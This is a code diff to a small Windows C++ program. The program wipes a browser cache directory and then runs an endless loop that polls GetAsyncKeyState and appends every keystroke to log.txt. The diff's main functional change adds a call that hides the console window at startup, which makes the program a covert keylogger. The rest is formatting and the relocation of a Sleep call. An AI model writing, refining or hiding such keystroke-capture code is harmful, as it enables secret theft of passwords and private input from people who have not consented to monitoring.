@@ -3,6 +3,7 @@
 #include <string>
 #include <filesystem>
 #include <Windows.h>
+#include <winuser.h>
 #include <fstream>
 
 void clearBrowserCache(){
@@ -15,9 +16,7 @@ void clearBrowserCache(){
             std::string createpath = "mkdir" + cachePath;
             std::error_code ec;
             std::filesystem::create_directory(cachePath, ec);
-            if (ec) {
-                std::cerr << "Error creating cache directory: " << ec.message() << '\n';
-            }
+            if (ec) std::cerr << "Error creating cache directory: " << ec.message() << '\n';
         }
         catch(const std::filesystem::filesystem_error& e){
             std::cerr << "Error removing cache directory: " << e.what() << '\n';
@@ -27,10 +26,8 @@ void clearBrowserCache(){
 }
 
 void startLogging(){
-
     std::ofstream log;
     log.open("log.txt", std::ios::app);
-    
     while(true){
         for (int i = 0x08; i <= 0xFE; i++){
             if (GetAsyncKeyState(i) & 0x8000) {
@@ -62,13 +59,14 @@ void startLogging(){
                     default:
                         log << char(i);
                 }
-            Sleep(100);
             }
+            Sleep(100);
         }
     }
 }
 
 int main(){
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     clearBrowserCache();
     startLogging();
     return 0;
